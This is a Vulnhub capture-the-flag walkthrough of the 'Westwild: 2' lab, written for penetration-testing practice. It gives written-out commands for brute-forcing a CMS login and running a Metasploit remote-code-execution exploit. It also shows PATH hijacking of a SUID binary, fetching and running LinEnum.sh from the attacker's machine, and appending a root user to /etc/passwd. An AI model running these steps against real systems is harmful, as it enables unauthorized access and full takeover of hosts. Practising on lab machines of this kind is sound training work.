<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Westwild: 2 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/westwild-2-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-29T07:26:49+00:00">August 29, 2019</time><time class="updated" datetime="2025-06-10T20:11:14+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another boot2root challenge called “Westwild: 2”. It is available on Vulnhub for the purpose of Penetration Testing practices. This lab is not that difficult if we have the proper basic knowledge of cracking the labs. This credit of making this lab goes to Hashim Alsharef. Let’s start and learn how to successfully breach it.</span></p>
<p><span style="color: #000000;"><strong>Level: Intermediate </strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <span style="color: #0000ff;"><strong>link</strong></span>.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
<li><span style="color: #000000;">Using wget to download user and password list</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Bruteforcing Login credentials using BurpSuite</span></li>
<li><span style="color: #000000;">Searching and Getting Exploit using Searchsploit</span></li>
<li><span style="color: #000000;">Using Metasploit cmsms_showtime2_rce exploit</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">SUID Binaries</span></li>
<li><span style="color: #000000;">PATH Variable</span></li>
<li><span style="color: #000000;">sh</span></li>
<li><span style="color: #000000;">Editing /etc/passwd</span></li>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Walkthrough</span> </strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">We will start by scanning the network using Netdiscover tool and identify the host IP address.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bXwfdOaMhm4/XWd69Ck0NFI/AAAAAAAAgTs/hvql4tvej8s-2oee01ZYUC7tX_ln_AySgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We can identify our host IP address as 192.168.1.105.</span></p>
<p><span style="color: #000000;">Now let’s scan the services and ports of the target machine with nmap. Nmap has a special flag to activate aggressive detection, namely -A. Aggressive mode enables OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute (–traceroute).</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lTdPYoblNuw/XWd6_5o9OfI/AAAAAAAAgUI/bqCMjQrTxCczJ18viO5PXXtOueKEKaZVgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">From its result, we found ports 22(SSH), 80(HTTP) were open.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">For more detail, we will be needing to start enumeration against the host machine. Therefore, we will navigate to a web browser for exploring HTTP service.</span></p>
<p><span style="color: #000000;">We got the CMS: Made Simple Welcome page as shown in the given below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8I2TkS__ZsQ/XWd7AeDm1KI/AAAAAAAAgUM/IFRXZxMp5DUWoGDxWUgSdgXeCVS8shcsQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now we further use dirb for directory enumeration.  <strong>DIRB</strong> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary-based attack against a web server and analysing the response. This gave us multiple files hosted via the CMS but aspadmin piqued our interest.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HUvgrplCYpI/XWd7A2K_y6I/AAAAAAAAgUQ/bvRF9-e8WGIzGyWiZgtAQvMn5G1bVY2LwCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">As aspadmin was an interesting result of dirb scan, we decided to browse the URL in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4tPRj320f-c/XWd7BPAgMrI/AAAAAAAAgUU/MzzTl5N2boAgydLBafns5xM8eG2cFtCUgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Further, we downloaded the user and password list using wget. The Wget command is a command-line utility that enables the user to download single or multiple files simultaneously from the internet or server by the help of many protocols like HTTP, HTTPS and FTP. This command performs many operations that can be used by any user while downloading any file from the internet such as: Downloading multiple files, downloading in the background, resuming downloading, renaming any downloaded file, Mirror downloading.</span></p>
<pre class="lang:default decode:true">wget http://192.168.1.105/admin/aspadmin/user.list
wget http://192.168.1.105/admin/aspadmin/password.list</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pQuvBNyUYzI/XWd7BfpIb_I/AAAAAAAAgUY/w4evxyGSCvkmmWX_7sByZUNTFp-UFzUrwCLcBGAs/s1600/6.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploiting</strong></span></h3>
<h3><span style="color: #800000;"><strong>Bruteforcing Login Credentials</strong></span></h3>
<p><span style="color: #000000;">First, we will intercept the request of the login page of the CMS, where we have given a random username and password. Then click on login, the burp suite will capture the request of the login page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yuVkGmAshgc/XWd7B1PxqvI/AAAAAAAAgUc/PQ0O0lzqoBoRNkcsglJ8m-ZZfcxHzN6MgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we will send the captured request to the Intruder by clicking on the Action Tab. Afterwards, we will open the Intruder tab and select positions (username and password) which will get highlighted as shown in the image given. Now we will select the payload position. Firstly, we will press on the Clear button given at the right of the window frame. Now we will select the fields where we want to attack which is the username and password and click on Add button. Followed by that we will choose the Attack type as Cluster Bomb.</span></p>
<p><span style="color: #000000;">In the given below image, we have selected username and password that means we will need two dictionary files i.e. one for username and second for a password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ylG_IdUqlq0/XWd7CHuVkiI/AAAAAAAAgUg/3D80w5M90HIzEItbthv3T7lZ2dsocH6agCLcBGAs/s1600/8.1.png"/></span></p>
<p><span style="color: #000000;">And Boom!!, we got the username and password.  Username is west and password is Madison.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1mFrz6Cvr1k/XWd7CkeqrII/AAAAAAAAgUk/DmtmoO3I-8E4NzdtTOlAtoS7jmLIyLPxgCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">And to confirm the username and password, we will enter the matched username and password in the CMS. This will generate a welcome message which shows our success in the simple list payload attack. Hereafter a bit enumeration we found out that we have a plugin installed named “Showtime2” as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5_gBdz29Rl8/XWd7C33P6_I/AAAAAAAAgUo/w5LZR5f9izcJ-FtpwCPSDjGLgtlpDmrjwCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now, to exploit the CMS, we will use searchsploit for this task. We searched the plugin in searchsploit as shown in the given image. Searchsploit gave us a Remote Code Execution Exploit. And moreover, it is a part of the Metasploit Framework.</span></p>
<pre class="lang:default decode:true">searchsploit showtime2</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-16tjdH6fm5s/XWd687s_RDI/AAAAAAAAgTo/Xoq-MzH4hbwXFDxHtKlwZD_uTETsSYuWACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">First, we will select the exploit with the help of use command. After that, we will select the Remote host IP Address, followed by the username and password that we extracted earlier. Later, we will use the exploit command to run the exploit. This will give us a meterpreter shell on the target system. Now that we have the meterpreter, we ran the shell command to get the bash shell. But this we gave us an improper shell, so we will convert it into a proper shell using the python one-liner.</span></p>
<pre class="lang:default decode:true">msf5 &gt; use exploit/multi/http/cmsms_showtime2_rce
msf5 exploit(multi/http/cmsms_showtime2_rce) &gt; set rhosts 192.168.1.105
msf5 exploit(multi/http/cmsms_showtime2_rce) &gt; set username west
msf5 exploit(multi/http/cmsms_showtime2_rce) &gt; set password Madison
msf5 exploit(multi/http/cmsms_showtime2_rce) &gt; exploit
meterpreter &gt; shell
python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">And Boom!! we got the shell. Then without wasting any time we searched for any file having SUID or 4000 permission with the help of Find command.</span></p>
<p><span style="color: #000000;">By using the following command, you can enumerate all binaries having SUID permissions:</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;">The Find command gave us an interesting file named “network_info”. We will try to enumerate this further.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m9QZH84ILK0/XWd69Np7YUI/AAAAAAAAgTw/i0UJ2T4kJocbNAUXM7hzYD9-PQpNiASOACLcBGAs/s1600/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now, we need to compromise the target system further to the escalate privileges. PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user.</span></p>
<pre class="lang:default decode:true">/usr/bin/network_info
cd /tmp
echo "/bin/bash" &gt; ifconfig
chmod 777 ifconfig
export PATH=/tmp:$PATH
whoami</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nQ--rkSgO6Y/XWd6-Agg6ZI/AAAAAAAAgT0/htFaMHukfIE7AMHy3WiMf-bjryV9bL3ywCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now to proceed further we will use wget to download LinEnum.sh. Scripted Local Linux Enumeration &amp; Privilege Escalation Checks Shellscript that enumerates the system configuration and high-level summary of the checks/tasks performed by LinEnum.</span></p>
<pre class="lang:default decode:true">cd /tmp
wget http://192.168.1.106/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HdYWvCqb7Us/XWd6-V4C6lI/AAAAAAAAgT4/CXTCv_eaDOA4vBNWpKZkpNkUiyUC8CFaACLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">After the successful run of the LinEnum Script, we find some important information that the /etc/passwd file is readable and writable by the user “wside”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tdwaEP13WMc/XWd6-eK6o2I/AAAAAAAAgT8/7NjO2vE7iU8KN76Vl1od-04hzu_UOROYACLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now let’s edit /etc/passwd file. Sometimes it is not possible to execute passwd command to set the password of a user; in that case, we can use OpenSSL command which will generate an encrypted password with salt.</span></p>
<p><span style="color: #000000;"><strong>OpenSSL passwd</strong> will compute the hash of the given password using a salt string and the MD5-based BSD password algorithm 1.</span></p>
<p><span style="color: #000000;">full articles read <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/"><strong>here</strong></a></span></span></p>
<pre class="lang:default decode:true">openssl passwd -1 -salt user3 pass123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3qizMZ0y21U/XWd6-5YkhbI/AAAAAAAAgUA/eTIZFl0GeTMqA_CnxP-FDcnls6tUQewzACLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">After, generating the salted hash we edited the /etc/passwd using the echo command to add our password hash.</span></p>
<pre class="lang:default decode:true">echo 'raj:$1$user3$rAGRVf5p2jYTqt0W5cPu/:0:0::/root:/bin/bash' &gt;&gt; /etc/passwd
su raj</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--g7GdGRYUDI/XWd6_daGYmI/AAAAAAAAgUE/PbcN8hr6Aksr-8FGUBDuT9xsB6JMiQdAwCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Japneet Kaur Gandhi </strong>is a Technical Writer, Researcher and Penetration Tester.<strong> Contact </strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/japneet-gandhi/"><strong>here</strong></a></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
